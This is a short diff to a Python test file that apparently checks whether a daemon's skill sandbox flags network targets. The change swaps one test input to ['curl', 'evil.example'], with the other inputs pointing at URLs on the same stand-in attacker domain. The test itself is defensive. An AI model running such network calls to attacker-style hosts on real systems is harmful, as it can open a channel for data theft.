@@ -208,7 +208,7 @@ async def test_f4b_registered_skill_identity_authorizes_at_effect_boundary(
 @pytest.mark.parametrize(
     "command",
     [
-        ["echo", "evil.example"],
+        ["curl", "evil.example"],
         ["echo", "--url=https://evil.example/path"],
         ["echo", "endpoint=https://evil.example/path"],
     ],
@@ -223,7 +223,7 @@ async def test_f4b_skill_authorization_uses_sandbox_network_target_surface(
     _configure_model_env(monkeypatch)
     config = _config(tmp_path)
     skill_path = tmp_path / "network-target-skill"
-    _write_command_skill(skill_path)
+    _write_command_skill(skill_path, shell_command=command[0])
     services = await DaemonServices.build(config)
     try:
         services.skill_manager.activate_bundle(skill_path)
